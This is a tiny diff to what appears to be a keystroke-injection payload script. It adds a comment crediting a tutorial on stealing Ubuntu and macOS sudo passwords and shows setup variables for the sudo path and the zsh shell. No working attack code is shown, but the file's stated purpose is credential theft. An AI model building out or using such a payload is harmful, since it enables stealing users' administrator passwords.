@@ -1,4 +1,4 @@
-
+REM Used code from https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/
 
 DEFINE SUDO_LOCATION /usr/bin/sudo
 DEFINE SHELL zsh
